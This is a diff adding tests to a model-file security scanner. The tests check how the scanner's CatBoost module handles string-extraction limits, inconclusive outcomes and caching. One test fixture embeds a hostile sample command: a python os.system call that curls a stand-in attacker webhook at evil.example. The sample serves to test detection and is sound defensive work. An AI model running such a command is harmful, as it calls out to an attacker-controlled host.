@@ -5,6 +5,7 @@ from __future__ import annotations
 import struct
 from pathlib import Path
 
+from modelaudit.cache import get_cache_manager, reset_cache_manager
 from modelaudit.core import determine_exit_code, scan_model_directory_or_file
 from modelaudit.scanners import get_scanner_for_file
 from modelaudit.scanners.base import INCONCLUSIVE_SCAN_OUTCOME, CheckStatus, IssueSeverity
@@ -118,6 +119,76 @@ def test_scan_bounded_parse_marks_uninspected_catboost_bytes_inconclusive(tmp_pa
     assert len(bounded_checks) == 1
     assert bounded_checks[0].status == CheckStatus.FAILED
     assert bounded_checks[0].details["analysis_incomplete"] is True
+
+
+def test_scan_string_extraction_limit_marks_late_payload_analysis_inconclusive(tmp_path: Path) -> None:
+    model_path = tmp_path / "bounded-strings.cbm"
+    model_path.write_bytes(
+        _build_cbm(
+            [
+                "safe_fragment_one",
+                "safe_fragment_two",
+                "python -c \"import os; os.system('curl https://evil.example/webhook')\"",
+            ],
+        ),
+    )
+
+    result = CatBoostScanner(config={"catboost_max_extracted_strings": 2}).scan(str(model_path))
+
+    assert result.success is False
+    assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
+    assert "catboost_string_extraction_limit_exceeded" in result.metadata["scan_outcome_reasons"]
+    budget_checks = [check for check in result.checks if check.name == "CatBoost Text Fragment Budget"]
+    assert len(budget_checks) == 1
+    assert budget_checks[0].status == CheckStatus.FAILED
+    assert budget_checks[0].details["truncated_sections"] == ["core"]
+    assert budget_checks[0].details["analysis_incomplete"] is True
+
+
+def test_scan_string_extraction_exact_limit_preserves_clean_result(tmp_path: Path) -> None:
+    model_path = tmp_path / "bounded-strings-benign.cbm"
+    model_path.write_bytes(_build_cbm(["safe_fragment_one", "safe_fragment_two"]))
+
+    result = CatBoostScanner(config={"catboost_max_extracted_strings": 2}).scan(str(model_path))
+
+    assert result.success is True
+    assert "scan_outcome" not in result.metadata
+    budget_checks = [check for check in result.checks if check.name == "CatBoost Text Fragment Budget"]
+    assert len(budget_checks) == 1
+    assert budget_checks[0].status == CheckStatus.PASSED
+    assert budget_checks[0].details["analysis_incomplete"] is False
+
+
+def test_scan_string_extraction_limit_aggregate_is_inconclusive_and_uncached(tmp_path: Path) -> None:
+    model_path = tmp_path / "bounded-strings.cbm"
+    model_path.write_bytes(_build_cbm(["safe_fragment_one", "safe_fragment_two"]))
+    cache_dir = tmp_path / "cache"
+
+    reset_cache_manager()
+    try:
+        first = scan_model_directory_or_file(
+            str(model_path),
+            catboost_max_extracted_strings=1,
+            cache_enabled=True,
+            cache_dir=str(cache_dir),
+            min_cache_file_size=0,
+        )
+        second = scan_model_directory_or_file(
+            str(model_path),
+            catboost_max_extracted_strings=1,
+            cache_enabled=True,
+            cache_dir=str(cache_dir),
+            min_cache_file_size=0,
+        )
+
+        for result in (first, second):
+            metadata = result.file_metadata[str(model_path)]
+            assert metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
+            assert "catboost_string_extraction_limit_exceeded" in metadata["scan_outcome_reasons"]
+            assert determine_exit_code(result) == 2
+        assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] == 0
+    finally:
+        reset_cache_manager()
 
 
 def test_scan_detects_correlated_command_and_network_indicators(tmp_path: Path) -> None:
